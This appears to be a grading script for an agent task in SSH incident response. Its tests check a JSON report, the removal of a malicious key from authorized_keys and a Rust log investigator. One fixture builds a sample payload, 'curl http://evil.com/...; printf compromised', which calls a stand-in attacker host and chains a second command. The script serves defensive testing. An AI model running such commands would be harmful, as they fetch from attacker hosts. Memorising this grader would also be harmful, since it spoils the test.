#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import stat
import json
import base64
import hashlib
import binascii
import collections
import secrets
import subprocess
import tempfile
import pytest

INCIDENT_DIR = "/home/user/incident"
SERVER_LOG = os.path.join(INCIDENT_DIR, "server.log")
AUTHORIZED_KEYS = os.path.join(INCIDENT_DIR, "authorized_keys")
REPORT_JSON = "/home/user/report.json"
RUST_SOURCE = "/home/user/investigator.rs"


def get_ssh_fingerprint(pubkey_line):
    parts = pubkey_line.strip().split()
    if len(parts) >= 2 and parts[0].startswith(("ssh-", "ecdsa-", "sk-")):
        try:
            key_data = base64.b64decode(parts[1], validate=True)
            digest = hashlib.sha256(key_data).digest()
            b64_digest = base64.b64encode(digest).decode('ascii').rstrip('=')
            return f"SHA256:{b64_digest}"
        except Exception:
            pass
    return None


def parse_server_log():
    attacker_ip = None
    decoded_payload = None
    fingerprints = {}

    with open(SERVER_LOG, 'r') as f:
        for line in f:
            line = line.strip()
            if "APP_REQ" in line:
                parts = line.split("APP_REQ: ")[1].split()
                ip = parts[0].split("=")[1]
                payload_hex = parts[1].split("=")[1]
                try:
                    payload_ascii = binascii.unhexlify(payload_hex).decode('ascii')
                    if "evil.com" in payload_ascii:
                        attacker_ip = ip
                        decoded_payload = payload_ascii
                except Exception:
                    pass
            elif "SSH_LOGIN" in line:
                parts = line.split("SSH_LOGIN: ")[1].split()
                ip = parts[0].split("=")[1]
                fp = parts[1].split("=")[1]
                fingerprints[ip] = fp

    return attacker_ip, decoded_payload, fingerprints


def test_01_report_json_correctness():
    assert os.path.isfile(REPORT_JSON), f"Report file {REPORT_JSON} is missing."

    attacker_ip, expected_payload, fingerprints = parse_server_log()
    assert attacker_ip is not None, "Could not find attacker IP in server.log."
    expected_fp = fingerprints.get(attacker_ip)
    assert expected_fp is not None, "Could not find attacker fingerprint in server.log."

    with open(REPORT_JSON, 'r') as f:
        try:
            report = json.load(f)
        except json.JSONDecodeError:
            pytest.fail(f"{REPORT_JSON} is not valid JSON.")

    assert "attacker_ip" in report, "Missing 'attacker_ip' in report."
    assert report["attacker_ip"] == attacker_ip, f"Expected attacker_ip {attacker_ip}, got {report['attacker_ip']}"

    assert "decoded_payload" in report, "Missing 'decoded_payload' in report."
    assert report["decoded_payload"] == expected_payload, f"Expected decoded_payload '{expected_payload}', got '{report['decoded_payload']}'"

    assert "compromised_fingerprint" in report, "Missing 'compromised_fingerprint' in report."
    assert report["compromised_fingerprint"] == expected_fp, f"Expected compromised_fingerprint {expected_fp}, got {report['compromised_fingerprint']}"
    assert set(report) == {"attacker_ip", "decoded_payload", "compromised_fingerprint"}, "Report does not have the exact required schema."


def test_02_authorized_keys_cleaned():
    assert os.path.isfile(AUTHORIZED_KEYS), f"File {AUTHORIZED_KEYS} is missing."

    attacker_ip, _, fingerprints = parse_server_log()
    bad_fp = fingerprints.get(attacker_ip)

    with open(AUTHORIZED_KEYS, 'r') as f:
        lines = f.read().splitlines()

    assert len(lines) > 0, f"{AUTHORIZED_KEYS} is empty. It should contain the legitimate keys."

    actual_fingerprints = []
    for line in lines:
        line = line.strip()
        assert line, f"{AUTHORIZED_KEYS} contains an unexpected blank line."
        fp = get_ssh_fingerprint(line)
        assert fp is not None, f"Malformed public key line remains in {AUTHORIZED_KEYS}: {line!r}"
        assert fp != bad_fp, f"The compromised key with fingerprint {bad_fp} is still in {AUTHORIZED_KEYS}."
        actual_fingerprints.append(fp)

    expected_fingerprints = [fp for ip, fp in fingerprints.items() if ip != attacker_ip]
    assert collections.Counter(actual_fingerprints) == collections.Counter(expected_fingerprints), \
        "authorized_keys does not contain exactly the legitimate keys identified by the log."


def test_03_rust_program_executes_and_handles_fresh_incident():
    assert os.path.exists(RUST_SOURCE), f"Rust source {RUST_SOURCE} is missing."
    assert not os.path.islink(RUST_SOURCE), f"{RUST_SOURCE} must be a real Rust source file, not a symlink."
    assert stat.S_ISREG(os.stat(RUST_SOURCE).st_mode), f"{RUST_SOURCE} is not a regular file."

    with tempfile.TemporaryDirectory(prefix="investigator-test-") as td:
        executable = os.path.join(td, "investigator")
        compile_result = subprocess.run(
            ["rustc", RUST_SOURCE, "-o", executable],
            cwd="/home/user",
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=30,
        )
        assert compile_result.returncode == 0, f"investigator.rs did not compile:\n{compile_result.stderr}"

        good_path = os.path.join(td, "legitimate_key")
        bad_path = os.path.join(td, "malicious_key")
        subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", good_path, "-N", "", "-q"], check=True, timeout=20)
        subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", bad_path, "-N", "", "-q"], check=True, timeout=20)

        with open(good_path + ".pub", "r") as f:
            good_line = f.read().rstrip("\n")
        with open(bad_path + ".pub", "r") as f:
            bad_line = f.read().rstrip("\n")

        good_fp = get_ssh_fingerprint(good_line)
        bad_fp = get_ssh_fingerprint(bad_line)
        assert good_fp and bad_fp

        token = secrets.token_hex(12)
        good_ip = f"172.20.{secrets.randbelow(200) + 1}.{secrets.randbelow(200) + 1}"
        bad_ip = f"10.77.{secrets.randbelow(200) + 1}.{secrets.randbelow(200) + 1}"
        payload = f"curl http://evil.com/{token}; printf compromised"
        payload_hex = payload.encode("ascii").hex()
        benign_hex = f"health check {token}".encode("ascii").hex()

        fresh_log = (
            f"[2026-01-02 03:04:01] SSH_LOGIN: IP={good_ip} FINGERPRINT={good_fp}\n"
            f"[2026-01-02 03:04:02] APP_REQ: IP={good_ip} PAYLOAD={benign_hex}\n"
            f"[2026-01-02 03:04:03] SSH_LOGIN: IP={bad_ip} FINGERPRINT={bad_fp}\n"
            f"[2026-01-02 03:04:04] APP_REQ: IP={bad_ip} PAYLOAD={payload_hex}\n"
        )
        with open(SERVER_LOG, "w") as f:
            f.write(fresh_log)
        with open(AUTHORIZED_KEYS, "w") as f:
            f.write(good_line + "\n" + bad_line + "\n")
        if os.path.exists(REPORT_JSON):
            os.remove(REPORT_JSON)

        run_result = subprocess.run(
            [executable],
            cwd="/home/user",
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=30,
        )
        assert run_result.returncode == 0, f"Compiled investigator failed:\nstdout:\n{run_result.stdout}\nstderr:\n{run_result.stderr}"
        assert os.path.isfile(REPORT_JSON), "Executing the Rust program did not create report.json."

        with open(REPORT_JSON, "r") as f:
            generated_report = json.load(f)
        assert generated_report == {
            "attacker_ip": bad_ip,
            "decoded_payload": payload,
            "compromised_fingerprint": bad_fp,
        }, "The Rust program did not decode and correlate the fresh incident correctly."

        with open(AUTHORIZED_KEYS, "r") as f:
            cleaned_contents = f.read()
        assert cleaned_contents == good_line + "\n", \
            "The Rust program did not remove only the malicious key while preserving the legitimate key exactly."
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
